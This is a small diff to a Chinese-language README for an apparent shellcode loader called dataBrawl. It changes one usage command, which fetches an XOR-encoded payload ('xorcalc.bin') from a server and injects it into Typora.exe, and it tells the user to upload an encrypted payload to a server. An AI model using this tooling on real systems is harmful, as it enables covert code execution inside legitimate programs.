@@ -73,7 +73,7 @@ python dataBrawl.py remote D:\Dev\dataBrawl-1.0\calc.bin -c 1
 将生成在根目录的encrypt.bin上传到服务器
 
 ```shell
-python main.py remote http://127.0.0.1/xorcalc.bin -i D:\Typora\Typora.exe
+python dataBrawl.py remote http://127.0.0.1/xorcalc.bin -i D:\Typora\Typora.exe
 ```
 
 ![image-20240417132140197](./assets/image-20240417132140197.png)
